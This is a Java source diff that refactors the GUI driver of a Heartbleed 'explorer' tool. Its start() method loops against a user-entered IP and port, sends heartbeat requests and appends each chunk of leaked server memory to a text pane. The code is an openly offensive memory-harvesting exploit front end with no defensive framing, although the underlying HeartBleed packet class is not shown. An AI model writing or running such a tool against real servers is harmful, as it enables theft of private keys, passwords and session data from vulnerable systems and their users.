@@ -7,14 +7,11 @@ package br.com.radaction.main;
 
 import java.awt.Toolkit;
 import java.io.IOException;
-import java.net.InetAddress;
-import java.net.UnknownHostException;
 import java.util.logging.Level;
 import java.util.logging.Logger;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 import javax.swing.JOptionPane;
-import javax.swing.SwingUtilities;
 import javax.swing.text.BadLocationException;
 import javax.swing.text.StyledDocument;
 
@@ -184,103 +181,58 @@ public class AppHbExplorer extends javax.swing.JFrame {
     }
 
     private void start() {
-        Thread worker = new Thread() {
-            @Override
-            public void run() {
+        Thread worker = null;
 
-                while (continueThread) {
-                    try {
-                        SwingUtilities.invokeLater(new Runnable() {
-                            @Override
-                            public synchronized void run() {
-                                try {
-                                    InetAddress ipTarget = InetAddress.getByName(txtIpAddr.getText());
-                                    HeartBleed hb = new HeartBleed();
-                                    StyledDocument sd = (StyledDocument) txtpTextOfServer.getDocument();
-                                    if (ipTarget.isReachable(300)) {
-                                        try {
-                                            hb.connect(txtIpAddr.getText(), Integer.valueOf(txtPort.getText()));
-                                            hb.hello();
-                                            boolean isVul = hb.heartBeat("");
-                                            if (isVul) {
-                                                if (!txtpTextOfServer.getText().contains(hb.getMemoryMessage())) {
-                                                    sd.insertString(sd.getLength(), hb.getMemoryMessage() + "\n", null);
-                                                }                                                
-                                            }else {
-                                                Thread.currentThread().interrupt();
-                                                JOptionPane.showMessageDialog(rootPane, "Not vulnerable!!!");
-                                                txtIpAddr.requestFocus();
-                                                tbtStartStop.setSelected(false);
-                                                tbtStartStop.setText("Start");
-                                                continueThread = false;
-                                            }
-                                        }
-                                        catch (BadLocationException ex) {
-                                            Logger.getLogger(AppHbExplorer.class.getName()).log(Level.SEVERE, null, ex);
-                                            JOptionPane.showMessageDialog(rootPane, "Can't possible connect!!");
-                                            txtIpAddr.requestFocus();
-                                            tbtStartStop.setSelected(false);
-                                            tbtStartStop.setText("Start");
-                                            Thread.currentThread().interrupt();
-                                            continueThread = false;
-                                        }
-                                        catch (IOException ex) {
-                                            Logger.getLogger(AppHbExplorer.class.getName()).log(Level.SEVERE, null, ex);
-                                            JOptionPane.showMessageDialog(rootPane, "Can't possible connect!!");
-                                            txtIpAddr.requestFocus();
-                                            tbtStartStop.setSelected(false);
-                                            tbtStartStop.setText("Start");
-                                            Thread.currentThread().interrupt();
-                                            continueThread = false;
-                                        }
-                                    } else {
-                                        JOptionPane.showMessageDialog(rootPane, "Can't possible connect!!");
-                                        txtIpAddr.requestFocus();
-                                        tbtStartStop.setSelected(false);
-                                        tbtStartStop.setText("Start");
-                                        Thread.currentThread().interrupt();
-                                        continueThread = false;
+        if (validateForm()) {
+            worker = new Thread() {
+                @Override
+                public void run() {
+                    StyledDocument sd = (StyledDocument) txtpTextOfServer.getDocument();
+                    while (continueThread) {
+                        HeartBleed hb = new HeartBleed();
+                        if (hb.connect(txtIpAddr.getText(), Integer.valueOf(txtPort.getText()))) {
+                            try {
+                                hb.hello();
+                                boolean testHb = hb.heartBeat("");
+                                if (testHb) {
+                                    String hbContent = hb.getMemoryMessage();
+                                    if (!txtpTextOfServer.getText().contains(hbContent)) {
+                                        sd.insertString(sd.getLength(), hbContent + "\n", null);
                                     }
                                 }
-                                catch (UnknownHostException ex) {
-                                    Logger.getLogger(AppHbExplorer.class.getName()).log(Level.SEVERE, null, ex);
-                                    JOptionPane.showMessageDialog(rootPane, "Can't possible connect!!");
-                                    txtIpAddr.requestFocus();
-                                    tbtStartStop.setSelected(false);
-                                    tbtStartStop.setText("Start");
-                                    Thread.currentThread().interrupt();
-                                    continueThread = false;
-
-                                }
-                                catch (IOException ex) {
-                                    Logger.getLogger(AppHbExplorer.class.getName()).log(Level.SEVERE, null, ex);
-                                    JOptionPane.showMessageDialog(rootPane, "Can't possible connect!!");
-                                    txtIpAddr.requestFocus();
-                                    tbtStartStop.setSelected(false);
-                                    tbtStartStop.setText("Start");
-                                    Thread.currentThread().interrupt();
-                                    continueThread = false;
-
-                                }
+                                Thread.sleep(1000);
                             }
-
-                        });
-                        if (!continueThread) {
+                            catch (IOException ex) {
+                                Logger.getLogger(AppHbExplorer.class.getName()).log(Level.SEVERE, null, ex);
+                                System.out.println("Not connect!");
+                            }
+                            catch (BadLocationException ex) {
+                                Logger.getLogger(AppHbExplorer.class.getName()).log(Level.SEVERE, null, ex);
+                                System.out.println("Not connect!");
+                            }
+                            catch (InterruptedException ex) {
+                                Logger.getLogger(AppHbExplorer.class.getName()).log(Level.SEVERE, null, ex);
+                                System.out.println("Not connect!");
+                            }
+                        } else {
+                            JOptionPane.showMessageDialog(rootPane, "Not vulnerable or unreachable!");
                             txtIpAddr.requestFocus();
                             tbtStartStop.setSelected(false);
                             tbtStartStop.setText("Start");
+                            continueThread = false;
                             Thread.currentThread().interrupt();
                         }
-                        Thread.sleep(2000);
-                    }
-                    catch (InterruptedException ex) {
-                        Logger.getLogger(AppHbExplorer.class.getName()).log(Level.SEVERE, null, ex);
-                    }
-                }
-            }
-        };
 
-        worker.start();
+                    }
+                    Thread.currentThread().interrupt();
+                }
+            };
+            worker.start();
+        } else {
+            JOptionPane.showMessageDialog(rootPane, "IP address is wrong!");
+            txtIpAddr.requestFocus();
+        }
+
     }
 
     private void setIcon() {
